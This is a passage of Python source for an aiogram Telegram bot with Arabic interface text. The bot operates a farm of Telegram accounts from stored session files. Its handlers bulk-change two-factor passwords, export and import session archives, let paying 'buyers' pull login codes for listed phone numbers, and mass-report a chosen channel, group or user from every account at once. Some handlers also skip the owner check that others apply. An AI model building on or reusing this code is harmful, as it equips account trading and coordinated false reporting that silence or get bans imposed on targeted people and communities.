    active = sum(1 for a in accs if a[2] == "active")
    msg = f"<blockquote>◉╮ 📊 إحصائيات شاملة\n◉᚜┃ 👥 إجمالي الحسابات: {total}\n◉᚜┃ ✅ حسابات نشطة: {active}\n◉╯ ❌ غير نشطة: {total - active}</blockquote>"
    await call.message.answer(msg, parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "performance")
async def performance_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    await call.message.answer("<blockquote>◉╮ ⚡ حالة النظام\n◉╯ النظام متصل ويعمل بكفاءة عالية.</blockquote>", parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "backup_now")
async def backup_now_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    await export_handler(call) # Re-use the export handler as it does exactly a zip of sessions.

@router.callback_query(F.data == "export")
async def export_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري إنشاء النسخة الاحتياطية...</blockquote>", parse_mode="HTML")
    
    zip_path = "sessions_backup.zip"
    try:
        def _create_export_zip():
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for root, dirs, files in os.walk(SESSIONS_DIR):
                    for file in files:
                        zipf.write(os.path.join(root, file), file)
        await asyncio.to_thread(_create_export_zip)
        
        doc = FSInputFile(zip_path)
        await call.message.answer_document(doc, caption="📦 نسخة احتياطية للجلسات")
    except Exception as e:
        await call.message.answer(f"<blockquote>◉╮ ❌ خطأ\n◉╯ حدث خطأ أثناء التصدير:\n◉╯ {e}</blockquote>", parse_mode="HTML")
    finally:
        if os.path.exists(zip_path): os.remove(zip_path)
    await call.answer()

@router.callback_query(F.data == "import_sessions")
async def import_sessions_start_handler(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    await state.set_state(SessionState.waiting_for_archive)
    await call.message.answer("<blockquote>◉╮ 📤 استيراد جلسات\n◉╯ أرسل الآن ملف ZIP الخاص بالجلسات للاستيراد:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(SessionState.waiting_for_archive, F.document)
async def import_sessions_file_handler(message: types.Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return

    document = message.document
    if not document.file_name.lower().endswith(".zip"):
        await message.answer("<blockquote>◉╮ ❌ خطأ في الملف\n◉╯ الملف يجب أن يكون بصيغة ZIP.</blockquote>", parse_mode="HTML")
        return

    safe_file_name = os.path.basename(document.file_name)
    archive_path = os.path.join(SESSIONS_DIR, f"import_{safe_file_name}")
    await message.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري رفع الملف وفحص الجلسات واستيراد الحسابات...</blockquote>", parse_mode="HTML")

    try:
        await message.bot.download(document, destination=archive_path)
        success, status_text, imported_phones, skipped_files = await import_sessions_archive(archive_path)

        response_lines = ["✅" if success else "❌", status_text]
        if imported_phones:
            response_lines.append(f"📱 تم استيراد {len(imported_phones)} حساب.")
            response_lines.extend([f"• {phone.replace('+', '')}" for phone in imported_phones[:20]])
            if len(imported_phones) > 20:
                response_lines.append(f"... و {len(imported_phones) - 20} حساب إضافي")
        if skipped_files:
            response_lines.append(f"⚠️ تعذر استيراد {len(skipped_files)} ملف جلسة.")

        await message.answer(f"<blockquote>◉╮ 📥 نتائج الاستيراد\n◉᚜┃ " + "\n◉᚜┃ ".join(response_lines) + "</blockquote>", parse_mode="HTML")
        await message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")
    except Exception as e:
        logger.error(f"خطأ أثناء رفع أو استيراد ملف الجلسات: {e}")
        await message.answer(f"<blockquote>◉╮ ❌ خطأ\n◉╯ حدث خطأ أثناء الاستيراد:\n◉╯ {e}</blockquote>", parse_mode="HTML")
    finally:
        if os.path.exists(archive_path):
            os.remove(archive_path)
        await state.clear()

@router.message(SessionState.waiting_for_archive)
async def import_sessions_invalid_handler(message: types.Message):
    await message.answer("<blockquote>◉╮ 📎 إرسال ملف\n◉╯ أرسل ملف ZIP فقط حتى أتمكن من استيراد الجلسات.</blockquote>", parse_mode="HTML")

# ====== Delete Account ======
@router.callback_query(F.data == "del")
async def del_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    accs = await get_accounts()
    btns = [[InlineKeyboardButton(text=a[0].replace('+', ''), callback_data=f"del_{a[0]}")] for a in accs]
    btns.append([InlineKeyboardButton(text="🔙 الغاء", callback_data="sec_accounts")])
    await call.message.edit_text("<blockquote>◉╮ 🗑 حذف حساب\n◉╯ اختر الحساب الذي تريد حذفه من القائمة:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "del_inactive")
async def del_inactive_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    
    accs = await get_accounts()
    inactive_count = sum(1 for a in accs if a[2] in ["inactive", "frozen"])
    if inactive_count == 0:
        return await call.answer("لا يوجد حسابات متوقفة حالياً.", show_alert=True)
        
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري حذف {inactive_count} حساب متوقف/محظور...</blockquote>", parse_mode="HTML")
    results = await delete_inactive_accounts_task()
    
    await call.message.answer(format_results(results, "🧹 تنظيف الحسابات المتوقفة"))
    await call.message.answer("<blockquote>◉╮ 📋 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("del_"))
async def execute_del(call: types.CallbackQuery):
    phone = call.data[4:]
    accs = await get_accounts()
    account = next((acc for acc in accs if acc[0] == phone), None)
    if not account:
        return await call.message.edit_text("<blockquote>◉╮ ❌ خطأ\n◉╯ لم يتم العثور على الحساب المطلوب.</blockquote>", parse_mode="HTML")

    await call.answer()

    phone, session_name, status, proxy = account[0], account[1], account[2], account[3]
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري إنهاء جلسة الحساب {phone.replace('+', '')} وحذفه...</blockquote>", parse_mode="HTML")
    
    try:
        success, result = await terminate_account_session_task(phone, session_name, proxy)
    except Exception as e:
        logger.error(f"Error in terminate_account_session_task: {e}")
        success, result = False, str(e)
    
    await delete_account_from_db(phone)
    session_file = os.path.join(SESSIONS_DIR, f"{session_name}.session")
    if os.path.exists(session_file):
        try: os.remove(session_file)
        except Exception: pass
        
    try:
        await call.message.edit_text(f"<blockquote>◉╮ ✅ تم الإزالة\n◉᚜┃ تم إزالة الحساب: {phone.replace('+', '')}\n◉╯ {result}</blockquote>", parse_mode="HTML")
    except Exception:
        await call.message.answer(f"<blockquote>◉╮ ✅ تم الإزالة\n◉᚜┃ تم إزالة الحساب: {phone.replace('+', '')}\n◉╯ {result}</blockquote>", parse_mode="HTML")
    
    await call.answer()

@router.callback_query(F.data == "cancel")
async def cancel_handler(call: types.CallbackQuery):
    await call.message.delete()

# ====== 2FA Management ======
@router.callback_query(F.data == "manage_2fa")
async def manage_2fa_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    btns = [
        [InlineKeyboardButton(text="🔓 تعطيل", callback_data="2fa_off"), InlineKeyboardButton(text="🔐 تفعيل", callback_data="2fa_on")],
        [InlineKeyboardButton(text="🔄 تغيير كلمة المرور", callback_data="2fa_change")],
        [InlineKeyboardButton(text="🔑 بريد تسجيل الدخول", callback_data="login_email_list")],
        [InlineKeyboardButton(text="🔍 فحص التحقق", callback_data="mail")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    await call.message.edit_text("<blockquote>◉╮ 🔐 إدارة التحقق بخطوتين\n◉╯ اختر العملية من القائمة أدناه:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "2fa_off")
async def f2a_off(call: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.edit_text("<blockquote>◉╮ 🔓 تعطيل التحقق\n◉╯ اختر هل تريد التعطيل لرقم محدد أو لكل الحسابات:</blockquote>", reply_markup=get_2fa_scope_keyboard("off"), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "2fa_on")
async def f2a_on(call: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.edit_text("<blockquote>◉╮ 🔐 تفعيل التحقق\n◉╯ اختر هل تريد التفعيل لرقم محدد أو لكل الحسابات:</blockquote>", reply_markup=get_2fa_scope_keyboard("on"), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "2fa_change")
async def f2a_change(call: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.edit_text("<blockquote>◉╮ 🔄 تغيير الباسوورد\n◉╯ اختر هل تريد التغيير لرقم محدد أو لكل الحسابات:</blockquote>", reply_markup=get_2fa_scope_keyboard("change"), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("2fa_scope_"))
async def f2a_scope_selector(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    _, _, action, scope = call.data.split("_", 3)
    await state.clear()
    await state.update_data(target_scope=scope, twofa_action=action)

    if scope == "single":
        accs = await get_accounts()
        active_accounts = [acc for acc in accs if acc[2] == "active"]
        if not active_accounts:
            return await call.answer("لا يوجد حسابات نشطة.", show_alert=True)

        await call.message.edit_text(
        "<blockquote>◉╮ 📱 تحديد الرقم\n◉╯ اختر الرقم المطلوب من القائمة أدناه:</blockquote>",
            reply_markup=get_2fa_target_keyboard(action, active_accounts),
            parse_mode="HTML"
        )
    else:
        if action == "change":
            await call.message.answer("<blockquote>◉╮ 🔄 تغيير الباسوورد\n◉╯ أرسل الباسوورد الجديد لكل الحسابات:</blockquote>", parse_mode="HTML")
            await state.set_state(Change2FAState.waiting_for_new_password)
        elif action == "off":
            await call.message.answer("<blockquote>◉╮ 🔓 تعطيل التحقق\n◉╯ أرسل الباسوورد الحالي لتعطيله عن كل الحسابات:</blockquote>", parse_mode="HTML")
            await state.set_state(Disable2FAState.waiting_for_password)
        else:
            await call.message.answer("<blockquote>◉╮ 🔐 تفعيل التحقق\n◉╯ أرسل الباسوورد الجديد لتفعيله على كل الحسابات:</blockquote>", parse_mode="HTML")
            await state.set_state(Enable2FAState.waiting_for_password)
    await call.answer()

@router.callback_query(F.data.startswith("2fa_target_"))
async def f2a_target_selector(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return await call.answer("مرفوض", show_alert=True)

    payload = call.data[len("2fa_target_"):]
    action, phone = payload.split("_", 1)
    await state.update_data(target_scope="single", twofa_action=action, target_phone=phone)

    if action == "change":
        await call.message.answer(f"<blockquote>◉╮ 🔄 تغيير الباسوورد\n◉╯ أرسل الباسوورد الجديد للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
        await state.set_state(Change2FAState.waiting_for_new_password)
    elif action == "off":
        await call.message.answer(f"<blockquote>◉╮ 🔓 تعطيل التحقق\n◉╯ أرسل الباسوورد الحالي للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
        await state.set_state(Disable2FAState.waiting_for_password)
    else:
        await call.message.answer(f"<blockquote>◉╮ 🔐 تفعيل التحقق\n◉╯ أرسل الباسوورد الجديد للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
        await state.set_state(Enable2FAState.waiting_for_password)
    await call.answer()

@router.message(Disable2FAState.waiting_for_password)
async def f2a_off_pwd(msg: types.Message, state: FSMContext):
    pwd = msg.text.strip()
    data = await state.get_data()
    phone = data.get("target_phone") if data.get("target_scope") == "single" else None
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري التعطيل...</blockquote>", parse_mode="HTML")
    res = await disable_2fa_task(pwd, phone=phone)
    try: await wait_msg.delete()
    except Exception: pass
    await msg.answer(format_results(res, "🔓 تعطيل التحقق"))
    await state.clear()

@router.message(Enable2FAState.waiting_for_password)
async def f2a_on_pwd(msg: types.Message, state: FSMContext):
    pwd = msg.text.strip()
    data = await state.get_data()
    phone = data.get("target_phone") if data.get("target_scope") == "single" else None
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري التفعيل...</blockquote>", parse_mode="HTML")
    res = await enable_2fa_task(pwd, phone=phone)
    try: await wait_msg.delete()
    except Exception: pass
    await msg.answer(format_results(res, "🔐 تفعيل التحقق"))
    await state.clear()

@router.message(Change2FAState.waiting_for_new_password)
async def f2a_change_new(msg: types.Message, state: FSMContext):
    new_pwd = msg.text.strip()
    data = await state.get_data()
    phone = data.get("target_phone") if data.get("target_scope") == "single" else None
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري التغيير...</blockquote>", parse_mode="HTML")
    res = await change_2fa_task(new_pwd, phone=phone)
    try: await wait_msg.delete()
    except Exception: pass
    await msg.answer(format_results(res, "🔄 تغيير كلمة المرور"))
    await state.clear()

# ====== Sales and Purchase (Sellers/Buyers) ======
@router.callback_query(F.data == "manage_sales")
async def manage_sales_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    btns = [
        [InlineKeyboardButton(text="➕ إضافة بائع", callback_data="add_seller"), InlineKeyboardButton(text="🗑 حذف بائع", callback_data="remove_seller")],
        [InlineKeyboardButton(text="📋 عرض البائعين", callback_data="list_sellers")],
        [InlineKeyboardButton(text="➕ إضافة مشتري", callback_data="add_buyer"), InlineKeyboardButton(text="🗑 حذف مشتري", callback_data="remove_buyer")],
        [InlineKeyboardButton(text="📋 عرض المشترين", callback_data="list_buyers")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    await call.message.edit_text("<blockquote>◉╮ 👥 إدارة البيع والشراء\n◉╯ اختر العملية من القائمة أدناه:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "list_sellers")
async def list_sellers(call: types.CallbackQuery):
    res = await get_all_resellers()
    if not res: return await call.message.answer("<blockquote>◉╮ 👥 البائعين\n◉╯ لا يوجد بائعين مضافين حالياً.</blockquote>", parse_mode="HTML")
    
    msg = "<blockquote>◉╮ 👥 قائمة البائعين\n"
    for s_id, s_name in res:
        count = await get_seller_stats(s_id)
        display = s_name if s_name else s_id
        msg += f"◉᚜┃ 👤 البائع: <a href='tg://user?id={s_id}'>{display}</a>\n◉᚜┃ 🔢 الحسابات: {count}\n"
    
    msg += "◉╯ انتهى عرض القائمة</blockquote>"
    await call.message.answer(msg, parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "add_seller")
async def start_add_seller(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ 👤 إضافة بائع\n◉╯ قم بإرسال ID البائع الجديد:</blockquote>", parse_mode="HTML")
    await state.set_state(AddSellerState.waiting_for_id)
    await call.answer()

@router.message(AddSellerState.waiting_for_id)
async def exec_add_seller(msg: types.Message, state: FSMContext):
    input_text = msg.text.strip()
    user_id = input_text
    display_name = input_text
    try:
        chat = await msg.bot.get_chat(input_text)
        user_id = str(chat.id)
        display_name = chat.full_name
    except Exception as e:
        logger.warning(f"Could not resolve seller identity for {input_text}: {e}")
        
    await add_reseller(user_id, display_name)
    await msg.answer(f"<blockquote>◉╮ ✅ تم الإضافة\n◉᚜┃ تم إضافة البائع: {display_name}\n◉╯ ID: <code>{user_id}</code></blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data == "remove_seller")
async def start_remove_seller(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ 🗑 حذف بائع\n◉╯ قم بإرسال ID البائع لحذفه:</blockquote>", parse_mode="HTML")
    await state.set_state(RemoveResellerState.waiting_for_id)
    await call.answer()

@router.message(RemoveResellerState.waiting_for_id)
async def exec_remove_seller(msg: types.Message, state: FSMContext):
    await remove_reseller(msg.text.strip())
    await msg.answer("<blockquote>◉╮ 🗑 تم الحذف\n◉╯ تم حذف البائع من القائمة بنجاح.</blockquote>", parse_mode="HTML")
    await state.clear()

# --- Buyer Management ---
@router.callback_query(F.data == "add_buyer")
async def start_add_buyer(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ 👤 إضافة مشتري\n◉╯ قم بإرسال ID أو معرف المشتري الجديد:</blockquote>", parse_mode="HTML")
    await state.set_state(AddBuyerState.waiting_for_id)
    await call.answer()

@router.message(AddBuyerState.waiting_for_id)
async def process_buyer_id(msg: types.Message, state: FSMContext):
    await state.update_data(buyer_id=msg.text.strip())
    await msg.answer("<blockquote>◉╮ 📊 حد الأكواد\n◉╯ قم بإرسال عدد الأكواد المسموح له بسحبها (مثلاً: 10):</blockquote>", parse_mode="HTML")
    await state.set_state(AddBuyerState.waiting_for_limit)

@router.message(AddBuyerState.waiting_for_limit)
async def process_buyer_limit(msg: types.Message, state: FSMContext):
    try:
        limit = int(msg.text.strip())
    except ValueError:
        return await msg.answer("<blockquote>◉╮ ❌ خطأ\n◉╯ الرجاء إدخال عدد صحيح فقط.</blockquote>", parse_mode="HTML")
    
    data = await state.get_data()
    input_id = data['buyer_id']
    buyer_id = input_id
    name = input_id
    try:
        chat = await msg.bot.get_chat(input_id)
        buyer_id = str(chat.id)
        name = chat.full_name
    except Exception as e:
        logger.warning(f"Could not resolve buyer identity for {input_id}: {e}")
        
    await add_buyer(buyer_id, limit, name)
    await msg.answer(f"<blockquote>◉╮ ✅ تم الإضافة\n◉᚜┃ تم إضافة المشتري: {name}\n◉᚜┃ حد السحب: {limit}\n◉╯ ID: <code>{buyer_id}</code></blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data == "remove_buyer")
async def start_remove_buyer(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ 🗑 حذف مشتري\n◉╯ قم بإرسال ID المشتري لحذفه:</blockquote>", parse_mode="HTML")
    await state.set_state(RemoveBuyerState.waiting_for_id)
    await call.answer()

@router.message(RemoveBuyerState.waiting_for_id)
async def exec_remove_buyer(msg: types.Message, state: FSMContext):
    await remove_buyer(msg.text.strip())
    await msg.answer("<blockquote>◉╮ 🗑 تم الحذف\n◉╯ تم حذف المشتري من القائمة بنجاح.</blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data == "list_buyers")
async def list_buyers_handler(call: types.CallbackQuery):
    buyers = await get_all_buyers()
    if not buyers: return await call.message.answer("<blockquote>◉╮ 👥 المشترين\n◉╯ لا يوجد مشترين مضافين حالياً.</blockquote>", parse_mode="HTML")
    
    msg = "<blockquote>◉╮ 👥 قائمة المشترين\n"
    for b_id, b_name, b_limit, b_pulled in buyers:
        display = b_name if b_name else b_id
        msg += f"◉᚜┃ 👤 المشتري: <a href='tg://user?id={b_id}'>{display}</a>\n◉᚜┃ 📊 الحد: {b_limit} | المسحوب: {b_pulled}\n"
    msg += "◉╯ انتهى عرض القائمة</blockquote>"
    await call.message.answer(msg, parse_mode="HTML")
    await call.answer()

# --- Buyer Logic: Pull Code ---
@router.callback_query(F.data == "pull_code")
async def pull_code_handler(call: types.CallbackQuery):
    buyer_info = await get_buyer_info(call.from_user.id)
    if not buyer_info: return await call.answer("مرفوض", show_alert=True)
    
    limit, pulled = buyer_info
    if pulled >= limit:
        return await call.answer("⚠️ لقد وصلت للحد الأقصى المسموح به لسحب الأكواد.", show_alert=True)
    
    accs = await get_accounts()
    active_accounts = [acc for acc in accs if acc[2] == "active"]
    if not active_accounts:
        return await call.answer("لا يوجد حسابات متوفرة حالياً.", show_alert=True)

    btns = [[InlineKeyboardButton(text=acc[0], callback_data=f"buyer_pull_{acc[0]}")] for acc in active_accounts]
    btns.append([InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")])
    await call.message.edit_text(
    f"<blockquote>◉╮ 🙋‍♂️ سحب الأكواد\n◉᚜┃ الرصيد المتبقي: {limit - pulled}\n◉╯ اختر الرقم المطلوب من القائمة:</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("buyer_pull_"))
async def execute_buyer_pull(call: types.CallbackQuery):
    phone = call.data[len("buyer_pull_"):]
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري جلب الكود للرقم <code>{phone}</code>...</blockquote>", parse_mode="HTML")
    
    success, result = await get_code_for_phone_task(phone)
    
    btns = [
        [InlineKeyboardButton(text="🔄 تحديث الكود", callback_data=f"buyer_pull_{phone}")],
        [InlineKeyboardButton(text="📱 اختيار رقم آخر", callback_data="pull_code")],
        [InlineKeyboardButton(text="🗑 حذف الرقم", callback_data=f"buyer_del_confirm_{phone}")],
        [InlineKeyboardButton(text="🔙 رجوع للقائمة", callback_data="main_menu")]
    ]
    
    status_icon = "✅" if success else "❌"
    
    if success:
        await increment_buyer_pulls(call.from_user.id)
        
        # Check if limit reached to auto-delete
        buyer_info = await get_buyer_info(call.from_user.id)
        if buyer_info:
            limit, pulled = buyer_info
            if pulled >= limit:
                await remove_buyer(str(call.from_user.id))
                await call.message.answer("<blockquote>◉╮ ⚠️ تنبيه\n◉╯ لقد استهلكت كامل حصتك من الأكواد. تم إنهاء اشتراكك وحذف حسابك تلقائياً.</blockquote>", parse_mode="HTML")
        
        await call.message.edit_text(
            f"<blockquote>◉╮ ✅ تم جلب الكود\n◉᚜┃ الرقم: <code>{phone.replace('+', '')}</code>\n◉╯ {result}</blockquote>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
            parse_mode="HTML"
        )
    else:
        await call.message.edit_text(
            f"<blockquote>◉╮ ❌ فشل جلب الكود\n◉᚜┃ الرقم: <code>{phone.replace('+', '')}</code>\n◉╯ {result}</blockquote>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
            parse_mode="HTML"
        )
    await call.answer()

@router.callback_query(F.data.startswith("buyer_del_confirm_"))
async def buyer_del_confirm_handler(call: types.CallbackQuery):
    if not await is_buyer(call.from_user.id): return await call.answer("مرفوض")
    
    phone = call.data[len("buyer_del_confirm_"):]
    btns = [
        [InlineKeyboardButton(text="⚠️ نعم، احذف الرقم", callback_data=f"buyer_del_exec_{phone}")],
        [InlineKeyboardButton(text="❌ لا، إلغاء", callback_data=f"buyer_pull_{phone}")]
    ]
    await call.message.edit_text(
        f"<blockquote>◉╮ ⚠️ تأكيد الحذف\n◉᚜┃ هل أنت متأكد من حذف الرقم <code>{phone.replace('+', '')}</code>؟\n◉╯ سيتم حذف الجلسة نهائياً.</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )
    await call.answer()

@router.callback_query(F.data.startswith("buyer_del_exec_"))
async def buyer_del_exec_handler(call: types.CallbackQuery):
    if not await is_buyer(call.from_user.id): return await call.answer("مرفوض")
    
    phone = call.data[len("buyer_del_exec_"):]
    accs = await get_accounts()
    account = next((acc for acc in accs if acc[0] == phone), None)
    if not account:
        return await call.message.edit_text("<blockquote>◉╮ ❌ خطأ\n◉╯ لم يتم العثور على الحساب المطلوب.</blockquote>", parse_mode="HTML")

    await call.answer()
    
    phone, session_name, status, proxy = account[0], account[1], account[2], account[3]
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري حذف الحساب <code>{phone.replace('+', '')}</code>...</blockquote>", parse_mode="HTML")
    await terminate_account_session_task(phone, session_name, proxy)
    
    await delete_account_from_db(phone)
    session_file = os.path.join(SESSIONS_DIR, f"{session_name}.session")
    if os.path.exists(session_file):
        os.remove(session_file)
        
    btns = [
        [InlineKeyboardButton(text="📱 سحب رقم آخر", callback_data="pull_code")],
        [InlineKeyboardButton(text="🔙 رجوع للقائمة", callback_data="main_menu")]
    ]
    await call.message.edit_text(
        f"<blockquote>◉╮ ✅ تم الحذف\n◉╯ تم حذف الرقم {phone.replace('+', '')} بنجاح.</blockquote>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=btns),
        parse_mode="HTML"
    )

# ====== Reporting Flow ======
@router.callback_query(F.data.in_(["rep_channel", "rep_group"]))
async def report_peer_start(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ 📢 إبلاغ جماعي\n◉╯ أرسل رابط الرسالة أو رابط القناة/الجروب:</blockquote>", parse_mode="HTML")
    await state.set_state(ReportState.waiting_for_link)
    await call.answer()

@router.message(ReportState.waiting_for_link)
async def process_report_link(message: types.Message, state: FSMContext):
    await state.update_data(link=message.text.strip())
    await message.answer("<blockquote>◉╮ 🎯 نوع الإبلاغ\n◉╯ اختر نوع الإبلاغ من القائمة أدناه:</blockquote>", reply_markup=get_report_types_keyboard(), parse_mode="HTML")
    await state.set_state(ReportState.waiting_for_type)

@router.callback_query(ReportState.waiting_for_type, F.data.startswith("type_"))
async def process_report_type(call: types.CallbackQuery, state: FSMContext):
    rtype = call.data.split("_")[1]
    await state.update_data(rtype=rtype)
    await call.message.edit_text("<blockquote>◉╮ 📝 وصف الإبلاغ\n◉╯ أرسل رسالة الإبلاغ (وصف المخالفة):</blockquote>", parse_mode="HTML")
    await state.set_state(ReportState.waiting_for_reason)
    await call.answer()

@router.message(ReportState.waiting_for_reason)
async def process_report_reason(message: types.Message, state: FSMContext):
    reason = message.text.strip()
    data = await state.get_data()
    link = data['link']
    rtype = data['rtype']
    
    wait_msg = await message.answer(f"<blockquote>◉╮ ⏳ جاري العمل\n◉᚜┃ جاري بدء الإبلاغ على {link}\n◉╯ السبب: {rtype}...</blockquote>", parse_mode="HTML")
    results = await report_peer_task(link, rtype, reason)
    try: await wait_msg.delete()
    except Exception: pass
    await message.answer(format_results(results, "📢 التقرير النهائي للإبلاغ"))
    await state.clear()

@router.callback_query(F.data == "rep_user")
async def report_user_start(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ 👤 إبلاغ عن مستخدم\n◉╯ أرسل يوزر الشخص أو الـ ID الخاص به:</blockquote>", parse_mode="HTML")
    await state.set_state(ReportUserState.waiting_for_username)
    await call.answer()

@router.message(ReportUserState.waiting_for_username)
async def process_report_user(message: types.Message, state: FSMContext):
    identifier = message.text.strip()
    wait_msg = await message.answer(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري الحظر والإبلاغ عن {identifier}...</blockquote>", parse_mode="HTML")
    results = await report_user_task(identifier)
    try: await wait_msg.delete()
    except Exception: pass
    await message.answer(format_results(results, "👤 التقرير النهائي لإبلاغ الحساب"))
    await state.clear()

# ====== Edit Account ======

@router.callback_query(F.data == "edit_account")
async def edit_account_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    accs = await get_accounts()
    active_accounts = [acc for acc in accs if acc[2] == "active"]
    if not active_accounts:
        return await call.answer("لا يوجد حسابات نشطة للتعديل.", show_alert=True)

    btns = [[InlineKeyboardButton(text=acc[0].replace('+', ''), callback_data=f"esel_{acc[0]}")] for acc in active_accounts]
    btns.append([InlineKeyboardButton(text="🔙 رجوع", callback_data="sec_accounts")])
    await call.message.edit_text("<blockquote>◉╮ 📱 تعديل البيانات\n◉╯ اختر الرقم الذي تريد تعديل بياناته:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("esel_"))
async def edit_select_handler(call: types.CallbackQuery):
    phone = call.data[5:]
    btns = [
        [InlineKeyboardButton(text="الاسم الأول", callback_data=f"e_fn_{phone}"), InlineKeyboardButton(text="الاسم الثاني", callback_data=f"e_ln_{phone}")],
        [InlineKeyboardButton(text="تعديل اليوزر", callback_data=f"e_un_{phone}"), InlineKeyboardButton(text="حذف اليوزر", callback_data=f"e_delun_{phone}")],
        [InlineKeyboardButton(text="إضافة صورة", callback_data=f"e_addph_{phone}"), InlineKeyboardButton(text="حذف الصور", callback_data=f"e_delph_{phone}")],
        [InlineKeyboardButton(text="تعديل البايو", callback_data=f"e_bio_{phone}"), InlineKeyboardButton(text="حذف البايو", callback_data=f"e_delbio_{phone}")],
        [InlineKeyboardButton(text="نشر ستوري", callback_data=f"e_story_{phone}")],
        [InlineKeyboardButton(text="🔙 رجوع للقائمة", callback_data="edit_account")]
    ]
    await call.message.edit_text(f"<blockquote>◉╮ ✏️ خيارات التعديل\n◉╯ الحساب: <code>{phone.replace('+', '')}</code></blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("e_fn_"))
async def e_fn_start(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[5:]
    await state.update_data(target_phone=phone)
    await state.set_state(EditAccountState.waiting_for_first_name)
    await call.message.answer(f"<blockquote>◉╮ ✏️ تعديل الاسم\n◉╯ أرسل الاسم الأول الجديد للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(EditAccountState.waiting_for_first_name)
async def e_fn_process(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("target_phone")
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري تنفيذ التعديل...</blockquote>", parse_mode="HTML")
    res = await edit_first_name_task(phone, msg.text)
    try: await wait_msg.delete()
    except Exception: pass
